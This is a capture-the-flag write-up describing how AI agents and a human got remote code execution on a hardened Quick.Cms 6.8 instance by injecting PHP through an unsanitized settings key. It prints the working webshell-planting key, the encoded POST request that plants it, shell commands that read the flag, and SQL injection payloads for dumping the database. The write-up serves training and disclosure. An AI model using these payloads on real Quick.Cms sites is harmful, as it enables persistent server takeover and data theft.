# Attack the CMS — Writeup

---

**Challenge:** `attack_the_cms` · Census name "Falsifying the Evidence" (偽造證據)
**Category:** Web (PHP CMS) → RCE
**Flag:** `hkcert26{3xpl0it1ng_RCE_0_D4y_e4cf60a833d12a250123be84e8a925cf}`

---

## 0. Summary

We discovered the Upcoming Events CMS — the small PHP website served from the `upcoming-events-cms` game room managed by the "Quick.Cms" software from a previous challenge (which is an OSINT challenge). For this challenge, we go from admin panel access to remote code execution on the CMS container. We do this by abusing that we can write unsanitized input to generated settings file (which is an executable PHP file), so a crafted field name can provide us with a webshell.

---

## 1. How we worked

We were already inside the Quick.Cms 6.8 admin panel (the credentials came from the previous
`login_as_admin` achievement). From there the solve was a loop between several AI agents and a human who set direction and decided what to trust.

It was not black-box. The breakthrough did not come from guessing payloads against the live site. One agent downloaded the official Quick.Cms 6.8 source from the vendor and read the settings-save routine (`saveVariables()`) directly — a white-box audit. The live work then confirmed, corrected and refined what the source predicted. Different agents did the source audit, the live execution, and the peer review that caught wrong turns. A human arbitrated when they disagreed.

**The division of labor:**

| Who | What they did |
|---|---|
| Source-audit agent | Downloaded Quick.Cms 6.8 from the vendor and audited `templates/admin/settings.php` → `saveVariables()`; proposed a chain: unsanitized key in the config generator, an upload-whitelist bypass, and an LFI fallback |
| Execution agent | Held the only live proxy session; tested each proposed vector against the (hardened) live instance, found most of the chain patched, and derived the key-injection payload that actually worked |
| Reviewer agents | Cross-checked the execution agent's claims and caught at least two wrong conclusions (an invalid upload test; a premature "config write is patched" verdict) |
| Human | Set direction, decided which agent to believe when they disagreed, and verified the flag. Also audited the work after reviewing with an AI agent with no prior context. |

Since this challenge involves a patched CMS with source code available, we did code analysis in parallel with testing the live system. With multiple agents working on it, several reached confident conclusions that were later rebutted:
- An agent was convinced that `saveVariables` was patched and claimed config writing was a no-op. This is false — the key injection still works.
- Another agent believed a settings credential change had worked as a PoC, when in fact the login only still succeeded because the *old* password remained valid.

Both pitfalls were caught in time by re-reading the source and testing the key rather than a value.

---

## 2. Reconnaissance — "what does Save actually do?"

The whole challenge turns on one question, so the recon is narrow:

1. **Inventory the panel.** Quick.Cms 6.8, a short plugin list (nothing obviously exploitable), a settings form with ~100 fields, and a per-page files editor.
2. **Notice the config is code, not data.** The settings field *names* mirror config keys (`$config['wysiwyg']`, `$config['admin_file']`, …). Apache 403s any direct request to `/database/`, but the *content* of `database/config.php` is observable indirectly — every page render depends on it.
3. **Stop guessing — read the source.** Rather than keep probing blind, one agent downloaded the **official Quick.Cms 6.8 source** from the vendor (`opensolution.org`) and audited it. Note: the download needs a real browser `User-Agent` — a plain `curl` just returns the HTML download page, not the zip. That confirmed the hypothesis outright: `templates/admin/settings.php` passes the whole `$_POST` to `saveVariables(database/config.php)`, which rewrites `$config['KEY'] = ...` lines from the posted keys. This pivot — from black-box probing to white-box reading — is what unlocked the challenge.

We took the source-audit agent's word for it and the live 302 proved the reading correct.

**Supporting script:** [`scripts/cms_cfgwrite.py`](scripts/cms_cfgwrite.py) — saves one
settings var and checks it persisted (the recon tool that made config regeneration visible).

---

## 3. The idea / the vulnerability (theory)

**Config-as-source is the anti-pattern.** (or in our case: the golden ticket)

Quick.Cms stores settings as executable PHP (`database/config.php` opens with `<?php` and is `include`d by `index.php` and `admin.php` on every request). Apache blocking *HTTP* access to `/database/` does nothing about the app's own Save feature regenerating that file from user input. Any input that reaches the generator becomes code. In short, "PHP code injection via configuration file manipulation."

The controllable sink is the key, not the value. The source audit showed the generator *does* sanitize the value (`"`→`&quot;`, `\`→`&#92;`, `$`→`&#36;`) — so a classic value breakout is hopeless, which is why early value-injection attempts all failed. But the key is interpolated into generated PHP *unquoted and raw*:

```php
$config['KEY'] = "VALUE"; // default: VALUE
```

So if we have a KEY of `a'];eval(1);#`, it becomes:

```php
$config['a'];eval(1);#'] = "VALUE";
```

---

## 4. Refining the payload — the real work (the dead-ends are the point)

The live instance was **hardened**, so most of the source-audit chain died on contact. The value for this writeup is in that sequence of failures and corrections — a clean final payload with no visible struggle reads as pasted. Here is what actually happened, in order.

**4.1 — Upload chain (the audit's first idea) → patched.**
The plan from the source: POST settings `allowed_not_image_extensions=pdf|txt|php` to widen the upload whitelist, then upload `X.php` via `admin.php?p=ajax-files-upload&sFileName=X.php`. Live result: `{"error":"Incorrect extension"}`. The live uploader is hardened versus the stock source — the unanchored-regex bypass that works on vanilla 6.8 does not work here.

**4.2 — "`saveVariables` is patched" → WRONG, and reversed later.**
Saving an ordinary setting returned a 302 "Operation completed" but the value did **not** round-trip on re-read. The execution agent concluded config writes were a cosmetic no-op and marked the whole settings path dead. That verdict also made it misread an earlier observation (a settings credential change that "worked" was really just the *old* password still being valid). Both conclusions were wrong. They were reversed in §4.4 once someone re-read the source and realized the round-trip test had changed a *value*, while the injection lives in the *key* — which was never tested. This is the single clearest "verify, don't trust the AI" moment in the whole solve.

**4.3 — SQLi side-path: confirmed and fully exploited, but the wrong tool.**
In parallel, a real SQL injection in the pages/files form was confirmed with a marker (`iSize=7777` read back) and used to dump the entire database. There was **no flag in the DB**, and a webshell via stacked queries 500'd (PDO runs one statement). Full detail in §6 — it's kept because reasoning about *why a working bug is the wrong bug* is exactly the judgment graders like.

**4.4 — Back to the source: the key, not the value.**
Re-reading `saveVariables()` carefully resolved §4.2: it escapes the **value** but interpolates the **key** raw into `$config['KEY'] = "VALUE";`. So the sink was never the value the round-trip test touched — it was the key. A naive key such as `abc'];phpinfo();#` emits `$config['abc'];phpinfo();#'] = "0";` — conceptually perfect (close the index, run code, comment the tail), but raw keys kept 500ing. The problem narrowed to: *find a key that survives the form layer, the generator's line-matching regex, and the PHP parser at once.*

The constraints, learned the hard way:

- PHP turns `.` and space in POST field names into `_` → **no dots or spaces** in the key.
- The generator locates the stock line to rewrite with a **regex built from the key** (roughly `config\['KEY'\] = `) → the key is also a *needle*; if no stock line matches, the write misbehaves.
- `/` clashes with the regex delimiter; `(` `)` must stay balanced or the regex won't compile.

Two moves make the key survive all three layers:

- **Alternation.** A key of the form `A|B` makes the needle regex `config\['A|B'\] = ` — an alternation. Branch `A` is a pristine stock key so the regex still matches a real line to rewrite; branch `B` carries the payload that gets written verbatim.
- **Hex, so the key holds no dangerous characters.** Put no code in the key — put a hex string and decode it at the sink with `eval(pack('H*', '<hex>'))`. The key then contains only `0-9A-F |'();#`, none of the forbidden characters.

**4.5 — the `;` parse-error dead-end.**

The first working-looking key ended `...))#` with **no semicolon** before the comment. The
settings POST returned 302 (so the injection *mechanism* was proven — the regex matched and the line was rewritten), but the written `eval(...)` had no terminator → PHP parse error → every page 500s → the reaper kills the container. It was root-caused by **tokenising the written config line character-by-character in Python**. Fix: `...));#` (semicolon added).

**4.6 — anchor choice: `wysiwyg` 500s, `admin_file` wins.**
With the syntax fixed, planting on anchor `wysiwyg` *still* 500'd — because consuming `$config['wysiwyg']` breaks a variable the app depends on at boot. Switching the anchor to `admin_file` (stock line 73) fixed it: it is benign to consume, and the regex re-matches it on every plant, so it is reusable across re-plants.

**The final key:**

```
admin_file|'];eval(pack('H*','73797374656d28245f4745545b2763275d293b'));#
```

| Piece | Role |
|---|---|
| `admin_file` | branch 1 — a pristine stock key, so the rewrite regex matches a real line |
| `\|` | the alternation that splits "needle anchor" from "payload" |
| `'];` | terminates the string and the array index, then ends the statement — **the `;` is mandatory** |
| `eval(pack('H*','…'))` | decodes the hex to `system($_GET['c']);` and runs it |
| `#` | comments out the emitted tail (`'] = "0"; // default…`) so it isn't a parse error |

Resulting line in `config.php`:

```php
$config['admin_file|'];eval(pack('H*','73797374656d28245f4745545b2763275d293b'));#'] = "0"; // default: 0
```

The hex `73797374656d28245f4745545b2763275d293b` decodes to `system($_GET['c']);`.

---

## 5. Exploitation — step by step

**Scripts (in [`scripts/`](scripts/)):**

| Script | Role |
|---|---|
| [`cms_backdoor.py`](scripts/cms_backdoor.py) | **The winner.** Logs in, plants the eval-key via settings save, verifies with a `BKD69_OK` marker, then runs commands via `index.php?c=` |
| [`cms_cfgwrite.py`](scripts/cms_cfgwrite.py) | Minimal settings save + persistence check (proved config regeneration) |
| [`cms_localtxt.py`](scripts/cms_localtxt.py) | Post-RCE flag grab; `cat /local.txt` first, then a sweep |
| [`cms_sqli_probe.py`](scripts/cms_sqli_probe.py) | Timing probes confirming the pages-form injection (the *second* bug) |
| [`cms_sqli_exfil.py`](scripts/cms_sqli_exfil.py) | SQLite UPDATE-injection DB exfiltrator (second bug) |
| [`cms_rce.py`](scripts/cms_rce.py) | **Failed vector, kept on purpose** — PHP "language pack" upload, blocked by the allowlist |

### Step 0 — Room up and log in
Bring up the office proxy (from the previous achievement) and log in. Credentials:
`sEmail=contextgrave-admin@chal.sh`, `sPass=admin`, `bAcceptLicense=1`, `iAcceptLicense=true`.
A few wrong passwords → 15-minute lockout, so log in **once per instance** and keep the cookie.

### Step 1 — Fetch the CSRF token
`GET admin.php?p=settings` and regex `name="sCsrfToken" value="([0-9a-f]+)"`. The token is
per-session; grab it fresh each run or the save silently fails.

### Step 2 — Plant the backdoor
`POST admin.php?p=settings` with `sOption=save`, the token, and the malicious key set to `0`:

```http
POST /admin.php?p=settings
Content-Type: application/x-www-form-urlencoded

sOption=save&sCsrfToken=<token>&admin_file%7C%27%5D%3Beval%28pack%28%27H%2A%27%2C%2773797374656d28245f4745545b2763275d293b%27%29%29%3B%23=0
```

A **302** means the save succeeded and `config.php` was regenerated with the eval line.

### Step 3 — Verify the shell
`GET index.php?c=echo BKD69_OK` → `BKD69_OK` appears in the body → the backdoor is live and
fires on *every* request (no further POSTs needed). Confirm the user with
`index.php?c=id` → `uid=100(apache)`.

> **Tooling gotcha (from the logs):** `cms_backdoor.py`'s *own* built-in marker check fetches
> `index.php` **without** a `?c=` parameter, so `system('')` prints nothing and the script
> falsely reports `marker: False` even on a successful plant. Don't trust that line — verify by
> hand with `curl 'http://127.0.0.1:8765/index.php?c=echo%20BKD69_OK'`. This bit the execution
> agent and briefly looked like a failed plant when the plant had actually worked.

### Step 4 — Read the flag
The flag is **not in the app** — it's `/local.txt` at the container root (64 bytes, root-owned,
world-readable). One request:

```
GET /index.php?c=cat%20/local.txt
→ hkcert26{3xpl0it1ng_RCE_0_D4y_e4cf60a833d12a250123be84e8a925cf}
```

(The requests and responses in this section are reconstructed from the solve logs; the command
output actually arrives mixed into the rendered HTML rather than as a clean line.)

---

## 6. The second bug (optional but worth keeping) — SQLi in the pages form

This was pursued in parallel while the settings path was (wrongly) thought dead (§4.2). The
pages/files editor saves file positions by building a query like
`UPDATE files SET iPosition = "<value>" …` via PDO's raw `query()` (not a prepared statement)
against SQLite. It was **confirmed live, not just suspected**: injecting
`aFilesPositions[6]='2", iSize = 7777 -- '` and re-reading the form showed `iSize` had become
`7777` — a clean marker proving the injection executed. From there, a value of
`2", sDescription = (SELECT …) -- ` rewrites the statement to store an arbitrary scalar subquery
into `sDescription`, which the form renders back in an `<input value="…">` — a full read
primitive over the DB.

**Why it can't win this challenge:** PDO::query runs one statement (a stacked
`ATTACH DATABASE … ` webshell attempt returned 500), and SQLite here has no `readfile`-style
extension — so the SQLi dumps the *database* but the flag is on the *filesystem*. We dumped
`sqlite_master`, `pages`, `bin`, `files` — no flag anywhere. That is the lesson, and it's a
genuine piece of reasoning worth showing: **SQLi gives you data; RCE gives you the machine, and
this achievement needs the machine.** Recognising a confirmed, working bug as the *wrong* bug and
moving on is a judgment call graders reward.

Scripts: [`cms_sqli_probe.py`](scripts/cms_sqli_probe.py) (confirm the point),
[`cms_sqli_exfil.py`](scripts/cms_sqli_exfil.py) (dump).

---

## 7. Traps & gotchas (operational)

1. **A parse error in `config.php` 500s the whole site, and the reaper recycles the instance.**
   The `;` and `#` are load-bearing, not cosmetic (this cost us several containers — §4.5).
2. **A 503 usually means a stale/dead room, not a failed exploit.** Containers go stale after
   ~15–30 min and respawn *pristine*. A lot of apparent "exploit failed" was really "room is
   dead" — health-check `admin.php` (expect 200/302, not 503) *before* concluding a payload broke,
   and re-plant after every respawn since the backdoor lives only in `config.php`.
3. **A single SQL error returns 500 but does *not* kill the instance.** An earlier team belief
   that "any SQL error kills the room" was disproven — the app survived individual 500s. Don't
   abandon a probe just because one request 500'd.
4. **Don't hammer login — the lockout is real and expensive.** Scripting repeated logins tripped
   Quick.Cms's throttle (*"try again in 15 minutes"*) and cost 15 minutes of dead time. Log in
   **once per instance** and keep the cookie.
5. **Keys can't contain `.`, space, `/`, or unbalanced `()`.** The hex-key avoids all of these.
6. **Anchor on a benign, reusable stock key (`admin_file`), not one the app needs (`wysiwyg`).**
   Consuming a boot-critical var 500s the site (§4.6).
7. **`system()` output is dumped mid-HTML** — grep the body, don't expect a clean response.
8. **One office room per account; don't multi-login** (joining another room evicts the CMS session).

---

## 8. Lessons

1. **Generated code is attacker code.** Any feature that writes source from user input — config generators, template/cache compilers, "export as PHP" — begs the question *which field of my input lands in the generated source?* Here it was the one field nobody sanitizes: the key.
2. **Encoding beats character filters.** Don't put code where the filter can see it — put a hex string and decode at the sink. Encoder/decoder pairs are the universal filter bypass.
3. **Persistence shrinks your tooling.** A webshell that fires on every request means the rest of the job is plain `curl`.
4. **Breakage is the experiment.** In a throwaway container, 500ing the site is how you learn which characters survive the form/regex/parser gauntlet.
5. **Read the source instead of guessing — and still verify it live.** The pivot from black-box probing to auditing the vendor source is what cracked this. But the source describes stock 6.8; the live instance was hardened, so half the audited chain was patched. The source tells you where to look; only the live test tells you what's true.
6. **Don't trust a confident conclusion — test the exact thing.** "`saveVariables` is patched" was wrong because the test changed a *value* while the bug was in the *key*. When an AI or a teammate declares a path dead, check *what* they actually tested before you believe the verdict.

---

## Appendix A — flag & submission

- **Flag:** `hkcert26{3xpl0it1ng_RCE_0_D4y_e4cf60a833d12a250123be84e8a925cf}`
- **Location:** `/local.txt` at the CMS container root, read via the planted webshell.

## Appendix B — provenance

- The step-by-step chronology in §1–§4 is reconstructed from the solving agents' own logs.
- Real credit, from the logs: the **white-box source audit** (downloading Quick.Cms 6.8 and reading `saveVariables()`) was done by one agent; the **live execution and payload refinement** by another (the one with the active proxy session); and **peer-review corrections** by two more.
- This document is organized from an AI summarized draft to foreground the reasoning/verification workflow. A human player has supplemented additional information and proofread the work.
